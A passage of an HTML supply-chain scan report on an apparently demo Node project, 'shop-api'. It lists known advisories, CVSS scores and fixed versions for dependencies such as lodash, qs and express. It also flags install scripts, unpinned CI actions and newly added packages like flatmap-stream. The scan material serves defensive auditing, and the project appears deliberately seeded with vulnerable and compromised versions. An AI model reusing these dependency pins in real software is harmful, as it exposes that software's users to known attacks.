+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; mocha@8.4.0 &rarr; js-yaml@4.0.0</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-h67p-54hq-rp68: JS-YAML: Quadratic-complexity DoS in merge key handling via repeated aliases</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/js-yaml]</span> installed js-yaml@4.0.0 is inside affected range &gt;=4.0.0 &lt;=4.1.1</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L)</li></ul><p><b>Fix info:</b> fixed in: 4.2.0 · introduced via: mocha@8.4.0</p></details></td>
+<td>js-yaml@4.0.0<br><small>transitive dev</small></td></tr><tr class="f" data-sev="medium" data-cat="vulnerability">
+<td><span class="sev" style="background:#c08b00">medium</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in js-yaml@4.0.0: js-yaml has prototype pollution in merge (&lt;&lt;)</summary>
+<p class="meta">GRD-acfcf230f1 · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-mh29-5h37-fv8m" target="_blank">GHSA-mh29-5h37-fv8m</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; mocha@8.4.0 &rarr; js-yaml@4.0.0</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-mh29-5h37-fv8m: js-yaml has prototype pollution in merge (&lt;&lt;)</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/js-yaml]</span> installed js-yaml@4.0.0 is inside affected range &gt;=4.0.0 &lt;4.1.1</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N)</li></ul><p><b>Fix info:</b> fixed in: 4.1.1 · introduced via: mocha@8.4.0</p></details></td>
+<td>js-yaml@4.0.0<br><small>transitive dev</small></td></tr><tr class="f" data-sev="medium" data-cat="vulnerability">
+<td><span class="sev" style="background:#c08b00">medium</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in lodash@4.17.15: Lodash has Prototype Pollution Vulnerability in `_.unset`, `_.omit`, and `_.pullAt` functions</summary>
+<p class="meta">GRD-a128fcec7d · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-xxjr-mmjv-4gpg" target="_blank">GHSA-xxjr-mmjv-4gpg</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; lodash@4.17.15</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-xxjr-mmjv-4gpg: Lodash has Prototype Pollution Vulnerability in `_.unset`, `_.omit`, and `_.pullAt` functions</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/lodash]</span> installed lodash@4.17.15 is inside affected range &gt;=4.0.0 &lt;=4.17.22</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 6.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L)</li></ul><p><b>Fix info:</b> fixed in: 4.17.23 · introduced via: lodash@4.17.15</p></details></td>
+<td>lodash@4.17.15<br><small>direct prod</small></td></tr><tr class="f" data-sev="medium" data-cat="vulnerability">
+<td><span class="sev" style="background:#c08b00">medium</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in lodash@4.17.15: Regular Expression Denial of Service (ReDoS) in lodash</summary>
+<p class="meta">GRD-d268e6a322 · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-29mw-wpgm-hmr9" target="_blank">GHSA-29mw-wpgm-hmr9</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; lodash@4.17.15</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-29mw-wpgm-hmr9: Regular Expression Denial of Service (ReDoS) in lodash</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/lodash]</span> installed lodash@4.17.15 is inside affected range &gt;=4.0.0 &lt;4.17.21</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L)</li></ul><p><b>Fix info:</b> fixed in: 4.17.21 · introduced via: lodash@4.17.15</p></details></td>
+<td>lodash@4.17.15<br><small>direct prod</small></td></tr><tr class="f" data-sev="medium" data-cat="vulnerability">
+<td><span class="sev" style="background:#c08b00">medium</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in nanoid@3.1.20: Exposure of Sensitive Information to an Unauthorized Actor in nanoid</summary>
+<p class="meta">GRD-a93a3b77dd · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-qrpm-p2h7-hrv2" target="_blank">GHSA-qrpm-p2h7-hrv2</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; mocha@8.4.0 &rarr; nanoid@3.1.20</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-qrpm-p2h7-hrv2: Exposure of Sensitive Information to an Unauthorized Actor in nanoid</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/nanoid]</span> installed nanoid@3.1.20 is inside affected range &gt;=3.0.0 &lt;3.1.31</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 5.5 (CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)</li></ul><p><b>Fix info:</b> fixed in: 3.1.31 · introduced via: mocha@8.4.0</p></details></td>
+<td>nanoid@3.1.20<br><small>transitive dev</small></td></tr><tr class="f" data-sev="medium" data-cat="vulnerability">
+<td><span class="sev" style="background:#c08b00">medium</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in nanoid@3.1.20: Predictable results in nanoid generation when given non-integer values</summary>
+<p class="meta">GRD-ab191ff106 · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-mwcw-c2x4-8c55" target="_blank">GHSA-mwcw-c2x4-8c55</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; mocha@8.4.0 &rarr; nanoid@3.1.20</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-mwcw-c2x4-8c55: Predictable results in nanoid generation when given non-integer values</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/nanoid]</span> installed nanoid@3.1.20 is inside affected range &lt;3.3.8</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 4.3 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N)</li></ul><p><b>Fix info:</b> fixed in: 3.3.8 · introduced via: mocha@8.4.0</p></details></td>
+<td>nanoid@3.1.20<br><small>transitive dev</small></td></tr><tr class="f" data-sev="medium" data-cat="vulnerability">
+<td><span class="sev" style="background:#c08b00">medium</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in qs@6.7.0: qs : qs.stringify with arrayFormat &#x27;comma&#x27; throws an uncaught TypeError on array elements carrying a non-callable own to</summary>
+<p class="meta">GRD-89e19feeeb · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-6pq8-jhm2-2vcw" target="_blank">GHSA-6pq8-jhm2-2vcw</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; express@4.17.1 &rarr; qs@6.7.0</li><li>shop-api@1.4.0 &rarr; express@4.17.1 &rarr; body-parser@1.19.0 &rarr; qs@6.7.0</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-6pq8-jhm2-2vcw: qs : qs.stringify with arrayFormat &#x27;comma&#x27; throws an uncaught TypeError on array elements carrying a non-callable own toString (DoS)</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/qs]</span> installed qs@6.7.0 is inside affected range &gt;=6.7.0 &lt;=6.16.0</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L)</li></ul><p><b>Fix info:</b> fixed in: 6.16.1 · introduced via: express@4.17.1</p></details></td>
+<td>qs@6.7.0<br><small>transitive prod</small></td></tr><tr class="f" data-sev="medium" data-cat="vulnerability">
+<td><span class="sev" style="background:#c08b00">medium</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in qs@6.7.0: qs&#x27;s arrayLimit bypass in its bracket notation allows DoS via memory exhaustion</summary>
+<p class="meta">GRD-e1d691c1d2 · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-6rw7-vpxm-498p" target="_blank">GHSA-6rw7-vpxm-498p</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; express@4.17.1 &rarr; qs@6.7.0</li><li>shop-api@1.4.0 &rarr; express@4.17.1 &rarr; body-parser@1.19.0 &rarr; qs@6.7.0</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-6rw7-vpxm-498p: qs&#x27;s arrayLimit bypass in its bracket notation allows DoS via memory exhaustion</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/qs]</span> installed qs@6.7.0 is inside affected range &lt;6.14.1</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L)</li></ul><p><b>Fix info:</b> fixed in: 6.14.1 · introduced via: express@4.17.1</p></details></td>
+<td>qs@6.7.0<br><small>transitive prod</small></td></tr><tr class="f" data-sev="medium" data-cat="vulnerability">
+<td><span class="sev" style="background:#c08b00">medium</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in qs@6.7.0: qs: Denial of Service via Attacker Controlled isBuffer</summary>
+<p class="meta">GRD-26b5a19a16 · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-4mjr-xmp4-gh2g" target="_blank">GHSA-4mjr-xmp4-gh2g</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; express@4.17.1 &rarr; qs@6.7.0</li><li>shop-api@1.4.0 &rarr; express@4.17.1 &rarr; body-parser@1.19.0 &rarr; qs@6.7.0</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-4mjr-xmp4-gh2g: qs: Denial of Service via Attacker Controlled isBuffer</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/qs]</span> installed qs@6.7.0 is inside affected range &gt;=2.2.5 &lt;6.16.0</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L)</li></ul><p><b>Fix info:</b> fixed in: 6.16.0 · introduced via: express@4.17.1</p></details></td>
+<td>qs@6.7.0<br><small>transitive prod</small></td></tr><tr class="f" data-sev="medium" data-cat="vulnerability">
+<td><span class="sev" style="background:#c08b00">medium</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in serialize-javascript@5.0.1: Serialize JavaScript has CPU Exhaustion Denial of Service via crafted array-like objects</summary>
+<p class="meta">GRD-5d10b6e47d · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-qj8w-gfj5-8c6v" target="_blank">GHSA-qj8w-gfj5-8c6v</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; mocha@8.4.0 &rarr; serialize-javascript@5.0.1</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-qj8w-gfj5-8c6v: Serialize JavaScript has CPU Exhaustion Denial of Service via crafted array-like objects</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/serialize-javascript]</span> installed serialize-javascript@5.0.1 is inside affected range &gt;=5.0.0 &lt;7.0.5</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 5.9 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H)</li></ul><p><b>Fix info:</b> fixed in: 7.0.5 · introduced via: mocha@8.4.0</p></details></td>
+<td>serialize-javascript@5.0.1<br><small>transitive dev</small></td></tr><tr class="f" data-sev="low" data-cat="cicd">
+<td><span class="sev" style="background:#3b6fb6">low</span></td>
+<td>cicd</td><td><details><summary>GitHub Action actions/checkout: first-party action pinned to mutable tag &#x27;v4&#x27;</summary>
+<p class="meta">GRD-0045796781 · rule CICD-UNPINNED-ACTION · verified evidence · confidence high
+</p>
+<p><b>Dependency path(s):</b></p><ul><li>—</li></ul><p><b>Evidence:</b></p><ul><li><b>workflow-line</b> <span class="src">[.github/workflows/ci.yml:.github/workflows/ci.yml:11]</span> uses: actions/checkout@v4</li></ul><p><b>Fix info:</b> pin to a full commit SHA: uses: actions/checkout@&lt;40-char-sha&gt; # v4</p></details></td>
+<td>actions/checkout@v4<br><small>direct ci</small></td></tr><tr class="f" data-sev="low" data-cat="install-script">
+<td><span class="sev" style="background:#3b6fb6">low</span></td>
+<td>install-script</td><td><details><summary>debug-helper-utils@1.0.2 runs an install-time script (contents not inspected)</summary>
+<p class="meta">GRD-a5912c6d8d · rule INSTALL-SCRIPT · verified evidence · confidence medium
+</p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; debug-helper-utils@1.0.2</li></ul><p><b>Evidence:</b></p><ul><li><b>lockfile-entry</b> <span class="src">[package-lock.json:node_modules/debug-helper-utils]</span> hasInstallScript: true</li></ul><p><b>Fix info:</b> inspect script; consider `npm ci --ignore-scripts` + allowlist</p></details></td>
+<td>debug-helper-utils@1.0.2<br><small>direct prod</small></td></tr><tr class="f" data-sev="low" data-cat="untrusted-image">
+<td><span class="sev" style="background:#3b6fb6">low</span></td>
+<td>untrusted-image</td><td><details><summary>Image &#x27;fastbuilds/node-runtime:18&#x27; is not pinned by digest</summary>
+<p class="meta">GRD-179def240a · rule IMAGE-NO-DIGEST · verified evidence · confidence high
+</p>
+<p><b>Dependency path(s):</b></p><ul><li>—</li></ul><p><b>Evidence:</b></p><ul><li><b>image-reference</b> <span class="src">[Dockerfile:Dockerfile:8]</span> image: fastbuilds/node-runtime:18</li></ul><p><b>Fix info:</b> append @sha256:&lt;digest&gt; so the tag cannot be silently re-pointed</p></details></td>
+<td>fastbuilds/node-runtime@18<br><small>direct prod</small></td></tr><tr class="f" data-sev="low" data-cat="vulnerability">
+<td><span class="sev" style="background:#3b6fb6">low</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in body-parser@1.19.0: body-parser vulnerable to denial of service when invalid limit value silently disables size enforcement</summary>
+<p class="meta">GRD-11583fc40e · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-v422-hmwv-36x6" target="_blank">GHSA-v422-hmwv-36x6</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; express@4.17.1 &rarr; body-parser@1.19.0</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-v422-hmwv-36x6: body-parser vulnerable to denial of service when invalid limit value silently disables size enforcement</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/body-parser]</span> installed body-parser@1.19.0 is inside affected range &lt;1.20.6</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L)</li></ul><p><b>Fix info:</b> fixed in: 1.20.6 · introduced via: express@4.17.1</p></details></td>
+<td>body-parser@1.19.0<br><small>transitive prod</small></td></tr><tr class="f" data-sev="low" data-cat="vulnerability">
+<td><span class="sev" style="background:#3b6fb6">low</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in cookie@0.4.0: cookie accepts cookie name, path, and domain with out of bounds characters</summary>
+<p class="meta">GRD-b530dd30bd · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-pxg6-pf52-xh8x" target="_blank">GHSA-pxg6-pf52-xh8x</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; express@4.17.1 &rarr; cookie@0.4.0</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-pxg6-pf52-xh8x: cookie accepts cookie name, path, and domain with out of bounds characters</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/cookie]</span> installed cookie@0.4.0 is inside affected range &lt;0.7.0</li></ul><p><b>Fix info:</b> fixed in: 0.7.0 · introduced via: express@4.17.1</p></details></td>
+<td>cookie@0.4.0<br><small>transitive prod</small></td></tr><tr class="f" data-sev="low" data-cat="vulnerability">
+<td><span class="sev" style="background:#3b6fb6">low</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in diff@5.0.0: jsdiff has a Denial of Service vulnerability in parsePatch and applyPatch</summary>
+<p class="meta">GRD-b9d736681d · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-73rr-hh4g-fpgx" target="_blank">GHSA-73rr-hh4g-fpgx</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; mocha@8.4.0 &rarr; diff@5.0.0</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-73rr-hh4g-fpgx: jsdiff has a Denial of Service vulnerability in parsePatch and applyPatch</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/diff]</span> installed diff@5.0.0 is inside affected range &gt;=5.0.0 &lt;5.2.2</li></ul><p><b>Fix info:</b> fixed in: 5.2.2 · introduced via: mocha@8.4.0</p></details></td>
+<td>diff@5.0.0<br><small>transitive dev</small></td></tr><tr class="f" data-sev="low" data-cat="vulnerability">
+<td><span class="sev" style="background:#3b6fb6">low</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in express@4.17.1: express vulnerable to XSS via response.redirect()</summary>
+<p class="meta">GRD-b92c8f07bb · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-qw6h-vgh9-j6wx" target="_blank">GHSA-qw6h-vgh9-j6wx</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; express@4.17.1</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-qw6h-vgh9-j6wx: express vulnerable to XSS via response.redirect()</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/express]</span> installed express@4.17.1 is inside affected range &lt;4.20.0</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 5.0 (CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:L)</li></ul><p><b>Fix info:</b> fixed in: 4.20.0 · introduced via: express@4.17.1</p></details></td>
+<td>express@4.17.1<br><small>direct prod</small></td></tr><tr class="f" data-sev="low" data-cat="vulnerability">
+<td><span class="sev" style="background:#3b6fb6">low</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in node-fetch@2.6.0: The `size` option isn&#x27;t honored after following a redirect in node-fetch</summary>
+<p class="meta">GRD-cac3402646 · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-w7rc-rwvf-8q5r" target="_blank">GHSA-w7rc-rwvf-8q5r</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; node-fetch@2.6.0</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-w7rc-rwvf-8q5r: The `size` option isn&#x27;t honored after following a redirect in node-fetch</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/node-fetch]</span> installed node-fetch@2.6.0 is inside affected range &gt;=2.0.0 &lt;2.6.1</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 2.6 (CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:N/I:N/A:L)</li></ul><p><b>Fix info:</b> fixed in: 2.6.1 · introduced via: node-fetch@2.6.0</p></details></td>
+<td>node-fetch@2.6.0<br><small>direct prod</small></td></tr><tr class="f" data-sev="low" data-cat="vulnerability">
+<td><span class="sev" style="background:#3b6fb6">low</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in qs@6.7.0: qs&#x27;s arrayLimit bypass in comma parsing allows denial of service</summary>
+<p class="meta">GRD-21cb217e64 · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-w7fw-mjwx-w883" target="_blank">GHSA-w7fw-mjwx-w883</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; express@4.17.1 &rarr; qs@6.7.0</li><li>shop-api@1.4.0 &rarr; express@4.17.1 &rarr; body-parser@1.19.0 &rarr; qs@6.7.0</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-w7fw-mjwx-w883: qs&#x27;s arrayLimit bypass in comma parsing allows denial of service</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/qs]</span> installed qs@6.7.0 is inside affected range &gt;=6.7.0 &lt;=6.14.1</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L)</li></ul><p><b>Fix info:</b> fixed in: 6.14.2 · introduced via: express@4.17.1</p></details></td>
+<td>qs@6.7.0<br><small>transitive prod</small></td></tr><tr class="f" data-sev="low" data-cat="vulnerability">
+<td><span class="sev" style="background:#3b6fb6">low</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in send@0.17.1: send vulnerable to template injection that can lead to XSS</summary>
+<p class="meta">GRD-b92970fd54 · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-m6fv-jmcg-4jfg" target="_blank">GHSA-m6fv-jmcg-4jfg</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; express@4.17.1 &rarr; send@0.17.1</li><li>shop-api@1.4.0 &rarr; express@4.17.1 &rarr; serve-static@1.14.1 &rarr; send@0.17.1</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-m6fv-jmcg-4jfg: send vulnerable to template injection that can lead to XSS</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/send]</span> installed send@0.17.1 is inside affected range &lt;0.19.0</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 5.0 (CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:L)</li></ul><p><b>Fix info:</b> fixed in: 0.19.0 · introduced via: express@4.17.1</p></details></td>
+<td>send@0.17.1<br><small>transitive prod</small></td></tr><tr class="f" data-sev="low" data-cat="vulnerability">
+<td><span class="sev" style="background:#3b6fb6">low</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in serialize-javascript@5.0.1: Serialize JavaScript: Cross-site scripting (XSS) via unescaped &lt;/script at the end of a serialized function body</summary>
+<p class="meta">GRD-fefc70206b · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-m5mm-p8h7-m29v" target="_blank">GHSA-m5mm-p8h7-m29v</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; mocha@8.4.0 &rarr; serialize-javascript@5.0.1</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-m5mm-p8h7-m29v: Serialize JavaScript: Cross-site scripting (XSS) via unescaped &lt;/script at the end of a serialized function body</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/serialize-javascript]</span> installed serialize-javascript@5.0.1 is inside affected range &lt;7.1.3</li></ul><p><b>Fix info:</b> fixed in: 7.1.3 · introduced via: mocha@8.4.0</p></details></td>
+<td>serialize-javascript@5.0.1<br><small>transitive dev</small></td></tr><tr class="f" data-sev="low" data-cat="vulnerability">
+<td><span class="sev" style="background:#3b6fb6">low</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in serve-static@1.14.1: serve-static vulnerable to template injection that can lead to XSS</summary>
+<p class="meta">GRD-6a3bfab569 · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-cm22-4g7w-348p" target="_blank">GHSA-cm22-4g7w-348p</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; express@4.17.1 &rarr; serve-static@1.14.1</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-cm22-4g7w-348p: serve-static vulnerable to template injection that can lead to XSS</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/serve-static]</span> installed serve-static@1.14.1 is inside affected range &lt;1.16.0</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 5.0 (CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:L)</li></ul><p><b>Fix info:</b> fixed in: 1.16.0 · introduced via: express@4.17.1</p></details></td>
+<td>serve-static@1.14.1<br><small>transitive prod</small></td></tr><tr class="f" data-sev="info" data-cat="install-script">
+<td><span class="sev" style="background:#6b7280">info</span></td>
+<td>install-script</td><td><details><summary>fsevents@2.3.3 runs a standard native-build install script</summary>
+<p class="meta">GRD-6bf1cce81c · rule INSTALL-SCRIPT · verified evidence · confidence high
+</p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; mocha@8.4.0 &rarr; chokidar@3.5.1 &rarr; fsevents@2.3.3</li></ul><p><b>Evidence:</b></p><ul><li><b>lockfile-entry</b> <span class="src">[package-lock.json:node_modules/fsevents]</span> hasInstallScript: true</li><li><b>script</b> <span class="src">[registry.npmjs.org/fsevents/2.3.3]</span> install: node-gyp rebuild</li></ul><p><b>Fix info:</b> install with --ignore-scripts and allowlist required builds; pin version</p></details></td>
+<td>fsevents@2.3.3<br><small>transitive dev</small></td></tr><tr class="f" data-sev="info" data-cat="unexpected-dependency">
+<td><span class="sev" style="background:#6b7280">info</span></td>
+<td>unexpected-dependency</td><td><details><summary>New transitive dependency: flatmap-stream@0.1.1</summary>
+<p class="meta">GRD-aef1f39854 · rule CHANGE-NEW-PACKAGE · verified evidence · confidence high
+</p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; event-stream@3.3.6 &rarr; flatmap-stream@0.1.1</li></ul><p><b>Evidence:</b></p><ul><li><b>sbom-diff</b> <span class="src">[demo/baseline/package-lock.json]</span> flatmap-stream not present in baseline</li><li><b>lockfile-entry</b> <span class="src">[package-lock.json:node_modules/flatmap-stream]</span> added flatmap-stream@0.1.1</li></ul><p><b>Fix info:</b> introduced via: event-stream@3.3.6</p></details></td>
+<td>flatmap-stream@0.1.1<br><small>transitive prod</small></td></tr><tr class="f" data-sev="info" data-cat="unexpected-dependency">
+<td><span class="sev" style="background:#6b7280">info</span></td>
+<td>unexpected-dependency</td><td><details><summary>New transitive dependency: ua-parser-js@0.7.29</summary>
+<p class="meta">GRD-1d01f76d70 · rule CHANGE-NEW-PACKAGE · verified evidence · confidence high
+</p>
+<p><b>Dependency path(s):</b></p><ul><li>—</li></ul><p><b>Evidence:</b></p><ul><li><b>sbom-diff</b> <span class="src">[demo/baseline/package-lock.json]</span> ua-parser-js not present in baseline</li><li><b>lockfile-entry</b> <span class="src">[package-lock.json:node_modules/ua-parser-js]</span> added ua-parser-js@0.7.29</li></ul></details></td>
+<td>ua-parser-js@0.7.29<br><small>transitive prod</small></td></tr><tr class="f" data-sev="info" data-cat="unexpected-dependency">
+<td><span class="sev" style="background:#6b7280">info</span></td>
+<td>unexpected-dependency</td><td><details><summary>event-stream changed: 3.3.4 -&gt; 3.3.6</summary>
